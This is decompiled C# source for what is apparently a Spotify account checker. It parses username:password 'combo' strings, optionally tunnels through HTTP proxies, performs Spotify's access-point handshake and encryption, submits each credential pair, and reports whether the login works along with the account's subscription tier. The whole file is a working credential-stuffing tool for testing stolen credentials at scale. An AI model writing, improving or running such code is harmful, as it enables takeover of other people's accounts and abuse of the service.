using System;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using com.google.protobuf;
using com.JB;
using com.JB.common;
using com.JB.core;
using com.JB.crypto;
using com.spotify;
using java.io;
using java.math;
using java.nio;
using java.security;
using java.security.spec;
using java.util;
using java.util.concurrent.atomic;
using javax.crypto;
using javax.crypto.spec;
using Leaf.xNet;
using Newtonsoft.Json.Linq;

namespace ConsoleApp1
{
	// Token: 0x02000002 RID: 2
	internal class blala
	{
		// Token: 0x06000001 RID: 1 RVA: 0x000023E0 File Offset: 0x000005E0
		public static TcpClient ProxyTcpClient(string targetHost, int targetPort, string httpProxyHost, int httpProxyPort)
		{
			TcpClient result;
			try
			{
				Uri uri = new UriBuilder
				{
					Scheme = Uri.UriSchemeHttp,
					Host = httpProxyHost,
					Port = httpProxyPort
				}.Uri;
				Uri uri2 = new UriBuilder
				{
					Scheme = Uri.UriSchemeHttp,
					Host = targetHost,
					Port = targetPort
				}.Uri;
				WebProxy proxy = new WebProxy(uri, true);
				WebRequest webRequest = WebRequest.Create(uri2);
				webRequest.Proxy = proxy;
				webRequest.Method = "CONNECT";
				Stream responseStream = ((HttpWebResponse)webRequest.GetResponse()).GetResponseStream();
				object value = responseStream.GetType().GetProperty("Connection", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(responseStream, null);
				NetworkStream networkStream = (NetworkStream)value.GetType().GetProperty("NetworkStream", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(value, null);
				Socket client = (Socket)networkStream.GetType().GetProperty("Socket", BindingFlags.Instance | BindingFlags.NonPublic).GetValue(networkStream, null);
				result = new TcpClient
				{
					Client = client
				};
			}
			catch (Exception)
			{
				result = null;
			}
			return result;
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000024E8 File Offset: 0x000006E8
		public static string check(string proxy, string combo)
		{
			try
			{
				JArray jarray = JArray.Parse(JObject.Parse(new HttpRequest().Get("http://apresolve.spotify.com/?type=accesspoint", null).ToString())["accesspoint"].ToString());
				System.Random random = new System.Random();
				string text = jarray[random.Next(0, jarray.Count)].ToString();
				TcpClient tcpClient;
				if (proxy == "null")
				{
					tcpClient = new TcpClient(text.Split(new char[]
					{
						':'
					})[0], int.Parse(text.Split(new char[]
					{
						':'
					})[1]));
				}
				else
				{
					tcpClient = blala.ProxyTcpClient(text.Split(new char[]
					{
						':'
					})[0], int.Parse(text.Split(new char[]
					{
						':'
					})[1]), proxy.Split(new char[]
					{
						':'
					})[0], int.Parse(proxy.Split(new char[]
					{
						':'
					})[1]));
				}
				if (tcpClient == null)
				{
					return "error";
				}
				tcpClient.ReceiveTimeout = 4000;
				tcpClient.SendTimeout = 4000;
				DiffieHellman diffieHellman = new DiffieHellman(new java.util.Random());
				byte[] array = Session.clientHello(diffieHellman);
				blala.Accumulator accumulator = new blala.Accumulator();
				NetworkStream stream = tcpClient.GetStream();
				stream.WriteByte(0);
				stream.WriteByte(4);
				stream.WriteByte(0);
				stream.WriteByte(0);
				stream.WriteByte(0);
				stream.Flush();
				int num = 6 + array.Length;
				byte[] bytes = BitConverter.GetBytes(num);
				stream.WriteByte(bytes[0]);
				stream.Write(array, 0, array.Length);
				stream.Flush();
				byte[] array2 = new byte[1000];
				int num2 = int.Parse(stream.Read(array2, 0, array2.Length).ToString());
				byte[] array3 = new byte[num2];
				Array.Copy(array2, array3, num2);
				array3 = array3.Skip(4).ToArray<byte>();
				accumulator.writeByte(0);
				accumulator.writeByte(4);
				accumulator.writeInt(num);
				accumulator.write(array);
				accumulator.writeInt(num2);
				accumulator.write(array3);
				accumulator.dump();
				Keyexchange.APResponseMessage apresponseMessage = Keyexchange.APResponseMessage.parseFrom(array3);
				byte[] key = Utils.toByteArray(diffieHellman.computeSharedKey(apresponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGs().toByteArray()));
				PublicKey publicKey = KeyFactory.getInstance("RSA").generatePublic(new RSAPublicKeySpec(new BigInteger(1, blala.serverKey), BigInteger.valueOf(65537L)));
				Signature instance = Signature.getInstance("SHA1withRSA");
				instance.initVerify(publicKey);
				instance.update(apresponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGs().toByteArray());
				instance.verify(apresponseMessage.getChallenge().getLoginCryptoChallenge().getDiffieHellman().getGsSignature().toByteArray());
				ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(100);
				Mac instance2 = Mac.getInstance("HmacSHA1");
				instance2.init(new SecretKeySpec(key, "HmacSHA1"));
				for (int i = 1; i < 6; i++)
				{
					instance2.update(accumulator.array());
					instance2.update(new byte[]
					{
						(byte)i
					});
					byteArrayOutputStream.write(instance2.doFinal());
					instance2.reset();
				}
				byte[] original = byteArrayOutputStream.toByteArray();
				instance2 = Mac.getInstance("HmacSHA1");
				instance2.init(new SecretKeySpec(Arrays.copyOfRange(original, 0, 20), "HmacSHA1"));
				instance2.update(accumulator.array());
				byte[] bytes2 = instance2.doFinal();
				byte[] array4 = Keyexchange.ClientResponsePlaintext.newBuilder().setLoginCryptoResponse(Keyexchange.LoginCryptoResponseUnion.newBuilder().setDiffieHellman(Keyexchange.LoginCryptoDiffieHellmanResponse.newBuilder().setHmac(ByteString.copyFrom(bytes2)).build()).build()).setPowResponse(Keyexchange.PoWResponseUnion.newBuilder().build()).setCryptoResponse(Keyexchange.CryptoResponseUnion.newBuilder().build()).build().toByteArray();
				num2 = 4 + array4.Length;
				stream.WriteByte(0);
				stream.WriteByte(0);
				stream.WriteByte(0);
				byte[] bytes3 = BitConverter.GetBytes(num2);
				stream.WriteByte(bytes3[0]);
				stream.Write(array4, 0, array4.Length);
				stream.Flush();
				Authentication.LoginCredentials loginCredentials = Authentication.LoginCredentials.newBuilder().setUsername(combo.Split(new char[]
				{
					':'
				})[0]).setTyp(Authentication.AuthenticationType.AUTHENTICATION_USER_PASS).setAuthData(ByteString.copyFromUtf8(combo.Split(new char[]
				{
					':'
				})[1])).build();
				Authentication.ClientResponseEncrypted clientResponseEncrypted = Authentication.ClientResponseEncrypted.newBuilder().setLoginCredentials(loginCredentials).setSystemInfo(Authentication.SystemInfo.newBuilder().setOs(Authentication.Os.OS_UNKNOWN).setCpuFamily(Authentication.CpuFamily.CPU_UNKNOWN).setSystemInformationString(com.JB.Version.systemInfoString()).setDeviceId(Utils.randomHexString(new java.util.Random(), 30)).build()).setVersionString(com.JB.Version.versionString()).build();
				Shannon shannon = new Shannon();
				shannon.key(Arrays.copyOfRange(byteArrayOutputStream.toByteArray(), 20, 52));
				AtomicInteger atomicInteger = new AtomicInteger(0);
				Shannon shannon2 = new Shannon();
				shannon2.key(Arrays.copyOfRange(byteArrayOutputStream.toByteArray(), 52, 84));
				AtomicInteger atomicInteger2 = new AtomicInteger(0);
				shannon.nonce(Utils.toByteArray(atomicInteger.getAndIncrement()));
				ByteBuffer byteBuffer = ByteBuffer.allocate(3 + clientResponseEncrypted.toByteArray().Length);
				byteBuffer.put(Packet.Type.Login.val).putShort((short)clientResponseEncrypted.toByteArray().Length).put(clientResponseEncrypted.toByteArray());
				byte[] array5 = byteBuffer.array();
				shannon.encrypt(array5);
				byte[] array6 = new byte[4];
				shannon.finish(array6);
				stream.Write(array5, 0, array5.Length);
				stream.Write(array6, 0, array6.Length);
				stream.Flush();
				shannon2.nonce(Utils.toByteArray(atomicInteger2.getAndIncrement()));
				byte[] array7 = new byte[3];
				stream.Read(array7, 0, 3);
				shannon2.decrypt(array7);
				byte[] array8 = new byte[(int)((short)((int)array7[1] << 8 | (int)(array7[2] & byte.MaxValue)))];
				stream.Read(array8, 0, array8.Length);
				shannon2.decrypt(array8);
				byte[] array9 = new byte[4];
				stream.Read(array9, 0, array9.Length);
				if (array7[0] == 172)
				{
					Authentication.APWelcome apwelcome = Authentication.APWelcome.parseFrom(array8);
					int num3 = 0;
					string text2 = "";
					string text3 = "";
					do
					{
						shannon2.nonce(Utils.toByteArray(atomicInteger2.getAndIncrement()));
						array7 = new byte[3];
						stream.Read(array7, 0, 3);
						shannon2.decrypt(array7);
						array8 = new byte[(int)((short)((int)array7[1] << 8 | (int)(array7[2] & byte.MaxValue)))];
						stream.Read(array8, 0, array8.Length);
						Thread.Sleep(10);
						shannon2.decrypt(array8);
						array9 = new byte[4];
						stream.Read(array9, 0, array9.Length);
						if (array7[0] == 27)
						{
							text3 = new ASCIIEncoding().GetString(array8);
							num3++;
						}
						if (array7[0] == 80)
						{
							System.Console.WriteLine(Session.parse(array8).get("financial-product").ToString());
							text2 = Session.parse(array8).get("financial-product").ToString();
							num3++;
						}
					}
					while (num3 < 2);
					string[] array10 = new string[5];
					array10[0] = text2;
					array10[1] = "-lol-";
					int num4 = 2;
					Authentication.APWelcome apwelcome2 = apwelcome;
					array10[num4] = ((apwelcome2 != null) ? apwelcome2.ToString() : null);
					array10[3] = "-lol-";
					array10[4] = text3;
					return string.Concat(array10);
				}
				if (array7[0] == 173)
				{
					return "invalid";
				}
			}
			catch (Exception)
			{
				return "error";
			}
			return "error";
		}

		// Token: 0x04000001 RID: 1
		public static byte[] serverKey = new byte[]
		{
			172,
			224,
			70,
			11,
			byte.MaxValue,
			194,
			48,
			175,
			244,
			107,
			254,
			195,
			191,
			191,
			134,
			61,
			161,
			145,
			198,
			204,
			51,
			108,
			147,
			161,
			79,
			179,
			176,
			22,
			18,
			172,
			172,
			106,
			241,
			128,
			231,
			246,
			20,
			217,
			66,
			157,
			190,
			46,
			52,
			102,
			67,
			227,
			98,
			210,
			50,
			122,
			26,
			13,
			146,
			59,
			174,
			221,
			20,
			2,
			177,
			129,
			85,
			5,
			97,
			4,
			213,
			44,
			150,
			164,
			76,
			30,
			204,
			2,
			74,
			212,
			178,
			12,
			0,
			31,
			23,
			237,
			194,
			47,
			196,
			53,
			33,
			200,
			240,
			203,
			174,
			210,
			173,
			215,
			43,
			15,
			157,
			179,
			197,
			50,
			26,
			42,
			254,
			89,
			243,
			90,
			13,
			172,
			104,
			241,
			250,
			98,
			30,
			251,
			44,
			141,
			12,
			183,
			57,
			45,
			146,
			71,
			227,
			215,
			53,
			26,
			109,
			189,
			36,
			194,
			174,
			37,
			91,
			136,
			byte.MaxValue,
			171,
			115,
			41,
			138,
			11,
			204,
			205,
			12,
			88,
			103,
			49,
			137,
			232,
			189,
			52,
			128,
			120,
			74,
			95,
			201,
			107,
			137,
			157,
			149,
			107,
			252,
			134,
			215,
			79,
			51,
			166,
			120,
			23,
			150,
			201,
			195,
			45,
			13,
			50,
			165,
			171,
			205,
			5,
			39,
			226,
			247,
			16,
			163,
			150,
			19,
			196,
			47,
			153,
			192,
			39,
			191,
			237,
			4,
			156,
			60,
			39,
			88,
			4,
			182,
			178,
			25,
			249,
			193,
			47,
			2,
			233,
			72,
			99,
			236,
			161,
			182,
			66,
			160,
			157,
			72,
			37,
			248,
			179,
			157,
			208,
			232,
			106,
			249,
			72,
			77,
			161,
			194,
			186,
			134,
			48,
			66,
			234,
			157,
			179,
			8,
			108,
			25,
			14,
			72,
			179,
			157,
			102,
			235,
			0,
			6,
			162,
			90,
			238,
			161,
			27,
			19,
			135,
			60,
			215,
			25,
			230,
			85,
			189
		};

		// Token: 0x02000003 RID: 3
		public class Accumulator : DataOutputStream
		{
			// Token: 0x06000005 RID: 5 RVA: 0x00002174 File Offset: 0x00000374
			internal Accumulator() : base(new ByteArrayOutputStream())
			{
			}

			// Token: 0x06000006 RID: 6 RVA: 0x00002181 File Offset: 0x00000381
			internal virtual void dump()
			{
				this.bytes = ((ByteArrayOutputStream)this.@out).toByteArray();
				this.close();
			}

			// Token: 0x06000007 RID: 7 RVA: 0x0000219F File Offset: 0x0000039F
			internal virtual byte[] array()
			{
				return this.bytes;
			}

			// Token: 0x04000002 RID: 2
			private byte[] bytes;
		}
	}
}
